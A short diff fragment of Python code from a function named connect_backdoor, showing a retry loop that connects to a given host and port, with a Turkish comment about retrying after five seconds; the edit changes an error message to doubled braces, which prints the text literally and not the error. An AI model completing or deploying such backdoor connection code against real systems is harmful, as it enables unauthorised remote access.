@@ -24,7 +24,7 @@ def connect_backdoor(host, port):
             print(f"Connected to {{host}}:{{port}}")
             break 
         except Exception as e:
-            print(f"Connection error: {e}")
+            print(f"Connection error: {{e}}")
             time.sleep(5)  # 5 saniye bekle ve yeniden bağlanmayı dene
 
     while True:
